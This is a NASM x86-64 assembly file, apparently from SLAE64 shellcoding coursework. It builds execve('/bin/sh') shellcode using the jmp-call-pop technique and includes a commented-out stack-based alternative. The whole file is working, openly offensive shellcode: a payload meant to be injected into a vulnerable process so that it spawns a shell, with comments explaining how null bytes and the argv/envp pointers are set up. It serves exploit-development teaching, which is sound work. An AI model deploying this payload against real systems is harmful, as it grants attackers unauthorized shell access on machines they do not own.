; File: execve-jmpcallpop.nasm
; Author: Kevin Ren, originally professor Viviek of SLAE64
; Purpose: shellcode a execve shellcode to spawn a shell using the jmp call pop method


global _start

section .text
_start: 
	jmp short call_shellcode

shellcode:
	; shellcode stuff
	pop rdi					; the address of /bin/shABBBBBBBBCCCCCCCC
	xor rax, rax				; zeroing out rax
	mov byte [rdi + 7], al			; replacing A with 0
	
	mov qword [rdi + 8], rdi		; moving the value of rdi (address of /bin/shA) to all the Bs
	mov qword [rdi + 16], rax		; replacing Cs with Null

	lea rsi, [rdi + 8]			; argv = string offset + 8, where its the address of the /bin/sh0 followed by 8 bytes of 0 (null)
	lea rdx, [rdi + 16]			; envp = string offset + 16, where its 8 bytes of Null

	mov al, 59				; execve syscall
	syscall			



call_shellcode:
	call shellcode
	string: db "/bin/shABBBBBBBBCCCCCCCC"



;	; zero out registers
;	xor rax, rax
;	xor rbx, rbx
;
;	; execve syscall (#59)
;	mov al, 59		
;	
;	; execve arguments
;	push rbx					; pushing NULL (zeros)
;	mov rcx, 0x68732f2f6e69622f			; pushing /bin//sh in reverse hex
;	push rcx 
;	mov rdi, rsp					; filename /bin//sh (1st arg)
;
;	push rbx					; pushing NULL
;	push rdi					; push address of /bin//sh00000000
;	mov rsi, rsp					; argv[/bin//sh00000000, 00000000] (2nd arg)
;
;	push rbx					; pushing NULL
;	mov rdx, rsp					; envp[00000000] (3rd arg)
;
;	; NOTE: could have just pushed NULL, /bin//sh [first arg], NULL [third arg], /bin//shNULL (first arg) [second arg]
;
;	syscall
